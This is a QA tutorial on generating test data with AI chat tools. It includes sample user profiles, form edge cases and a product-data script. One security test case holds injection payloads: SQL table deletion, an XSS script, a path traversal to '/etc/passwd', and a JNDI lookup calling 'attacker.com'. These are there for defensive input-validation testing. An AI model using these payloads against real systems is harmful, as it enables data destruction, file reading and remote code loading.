# AI-Generated Test Data

**ID:** QA-05  
**Platform:** ChatGPT + Test Data Generation  

## Target Audience
QA / Testers

## AI Used
ChatGPT/MS Copilot

## AI Knowledge Level
Beginner

## Technical Summary
Generate realistic, diverse test data sets automatically for comprehensive testing scenarios.

## Content

### 🧠 Introduction – AI Test Data Generation

Manual test data creation is time-consuming and often lacks diversity. AI can generate:
- **Realistic user profiles** with consistent demographics
- **Edge case scenarios** that are hard to think of manually
- **Large datasets** for performance testing
- **Localized data** for international testing

### 🧪 Demonstration 1 — User Profile Test Data

#### 🎯 Goal
Generate diverse, realistic user profiles for e-commerce testing.

#### ⚙️ Technical Steps

1. **Request specific test data from AI**:
```
Generate 10 realistic user profiles for e-commerce testing with:
- Demographics (age, location, income bracket)
- Shopping behavior patterns
- Edge cases included
- Format as JSON
- Include both typical and unusual scenarios
```

2. **AI generates comprehensive test data**:
```json
{
  "testUsers": [
    {
      "id": "user_001",
      "name": "Sarah Chen",
      "email": "sarah.chen@email.com",
      "age": 28,
      "location": "San Francisco, CA",
      "incomeBracket": "high",
      "shoppingBehavior": {
        "frequency": "weekly",
        "averageOrderValue": 250,
        "preferredCategories": ["electronics", "fashion"],
        "paymentMethod": "credit_card",
        "mobileUsage": 80
      },
      "testScenario": "tech-savvy high earner"
    },
    {
      "id": "user_002", 
      "name": "Robert Johnson",
      "email": "r.johnson@email.com",
      "age": 67,
      "location": "Rural Montana",
      "incomeBracket": "fixed_income",
      "shoppingBehavior": {
        "frequency": "monthly",
        "averageOrderValue": 45,
        "preferredCategories": ["books", "home_garden"],
        "paymentMethod": "check",
        "mobileUsage": 15
      },
      "testScenario": "senior with limited tech skills"
    },
    {
      "id": "user_003",
      "name": "Alex Rivera", 
      "email": "alex.rivera+test@email.com",
      "age": 19,
      "location": "Austin, TX",
      "incomeBracket": "student",
      "shoppingBehavior": {
        "frequency": "impulse",
        "averageOrderValue": 25,
        "preferredCategories": ["fashion", "entertainment"],
        "paymentMethod": "digital_wallet",
        "mobileUsage": 95
      },
      "testScenario": "mobile-first gen-z student"
    },
    {
      "id": "user_004",
      "name": "Maria Gonzalez",
      "email": "maria@email.com",
      "age": 35,
      "location": "Miami, FL", 
      "incomeBracket": "medium",
      "shoppingBehavior": {
        "frequency": "bulk_monthly",
        "averageOrderValue": 180,
        "preferredCategories": ["groceries", "family"],
        "paymentMethod": "debit_card",
        "mobileUsage": 60
      },
      "testScenario": "family shopper, bulk purchases"
    },
    {
      "id": "user_005",
      "name": "李小明",
      "email": "xiaoming.li@email.cn",
      "age": 31,
      "location": "Beijing, China",
      "incomeBracket": "high",
      "shoppingBehavior": {
        "frequency": "weekly",
        "averageOrderValue": 320,
        "preferredCategories": ["luxury", "electronics"],
        "paymentMethod": "mobile_payment",
        "mobileUsage": 90
      },
      "testScenario": "international user, non-latin characters"
    }
  ]
}
```

### 🧪 Demonstration 2 — Edge Case Test Data

#### 🎯 Goal
Generate edge cases and boundary value test data for form validation.

#### ⚙️ Technical Steps

1. **Request edge case data**:
```
Generate edge case test data for user registration form with fields:
- Email (required, must be valid)
- Password (8-50 chars, must contain special char)
- Name (2-100 chars, letters only)
- Phone (optional, various formats)
- Date of birth (18+ years required)

Include boundary values, invalid inputs, and security test cases.
```

2. **AI generates edge case scenarios**:
```json
{
  "edgeCaseTestData": {
    "validBoundaryValues": [
      {
        "email": "a@b.co",
        "password": "A1234567!",
        "name": "Li",
        "phone": "+1234567890",
        "dateOfBirth": "2006-01-01",
        "description": "minimum valid values"
      },
      {
        "email": "very.long.email.address.for.testing.boundaries@very-long-domain-name.example.com",
        "password": "A123456789012345678901234567890123456789012345678!",
        "name": "VeryLongFirstNameThatIsStillValidButAtTheMaximumLengthAllowedByTheSystemForTestingPurposes",
        "phone": "+1-800-555-0123-ext-999999",
        "dateOfBirth": "1900-01-01",
        "description": "maximum valid values"
      }
    ],
    "invalidInputs": [
      {
        "email": "notanemail",
        "password": "short",
        "name": "123Name",
        "phone": "invalid-phone",
        "dateOfBirth": "2020-01-01",
        "expectedErrors": ["invalid email", "password too short", "name contains numbers", "invalid phone format", "user under 18"]
      },
      {
        "email": "user@",
        "password": "NoSpecialChar123",
        "name": "A",
        "phone": "12345678901234567890",
        "dateOfBirth": "invalid-date",
        "expectedErrors": ["incomplete email", "no special character", "name too short", "phone too long", "invalid date format"]
      }
    ],
    "securityTestCases": [
      {
        "email": "test@example.com'; DROP TABLE users; --",
        "password": "<script>alert('xss')</script>",
        "name": "../../etc/passwd",
        "phone": "${jndi:ldap://attacker.com/exploit}",
        "dateOfBirth": "1990-01-01",
        "description": "SQL injection, XSS, path traversal, JNDI injection attempts"
      },
      {
        "email": "test@example.com",
        "password": "password123!",
        "name": "Normal User",
        "phone": "+1234567890",
        "dateOfBirth": "1990-01-01",
        "description": "valid data for baseline comparison"
      }
    ]
  }
}
```

### 🧪 Demonstration 3 — Performance Test Data

#### 🎯 Goal
Generate large datasets for performance and load testing.

#### ⚙️ Technical Steps

1. **Request performance test data**:
```
Generate a large dataset for performance testing an e-commerce product catalog:
- 1000 products across 20 categories
- Realistic product names, descriptions, prices
- Various inventory levels
- Different seller ratings
- Include performance edge cases (very long descriptions, special characters)
```

2. **AI provides data generation strategy**:
```python
# AI-generated Python script for test data creation
import random
import uuid
from datetime import datetime, timedelta

def generate_performance_test_data():
    categories = [
        "Electronics", "Clothing", "Books", "Home & Garden", "Sports",
        "Beauty", "Toys", "Automotive", "Health", "Office",
        "Pet Supplies", "Jewelry", "Tools", "Kitchen", "Music",
        "Movies", "Games", "Baby", "Shoes", "Watches"
    ]
    
    products = []
    
    for i in range(1000):
        # Create realistic product data
        product = {
            "id": str(uuid.uuid4()),
            "name": generate_product_name(),
            "category": random.choice(categories),
            "price": round(random.uniform(5.99, 999.99), 2),
            "inventory": random.randint(0, 1000),
            "description": generate_description(),
            "rating": round(random.uniform(1.0, 5.0), 1),
            "reviewCount": random.randint(0, 10000),
            "seller": f"Seller_{random.randint(1, 100)}",
            "createdDate": datetime.now() - timedelta(days=random.randint(1, 365))
        }
        
        # Add performance edge cases (5% of products)
        if i % 20 == 0:
            product["description"] = "Very long description " * 500  # Large text field
            product["name"] = "Product with émojis 🎉 and spéciál characters ñáéíóú"
            
        products.append(product)
    
    return products

def generate_product_name():
    adjectives = ["Premium", "Deluxe", "Ultra", "Pro", "Smart", "Classic"]
    nouns = ["Widget", "Device", "Tool", "Kit", "Set", "System"]
    return f"{random.choice(adjectives)} {random.choice(nouns)} {random.randint(100, 9999)}"

def generate_description():
    templates = [
        "High-quality {} perfect for {}. Features include {}.",
        "Professional grade {} designed for {}. Comes with {}.",
        "Innovative {} solution for {}. Includes {}."
    ]
    return random.choice(templates).format(
        random.choice(["product", "item", "tool"]),
        random.choice(["home use", "professionals", "daily tasks"]),
        random.choice(["warranty", "free shipping", "24/7 support"])
    )
```

### 💡 Test Data Best Practices

**Data Quality:**
- Ensure data reflects real-world diversity
- Include edge cases and boundary values
- Maintain data consistency across related fields
- Test with both valid and invalid data sets

**Security Considerations:**
- Never use real personal data for testing
- Include security test cases (injection attempts)
- Test with various character encodings
- Validate data sanitization processes

## Summary

AI-generated test data provides comprehensive, realistic datasets that improve test coverage while saving time. By automating data generation, QA teams can focus on test execution and analysis rather than data preparation.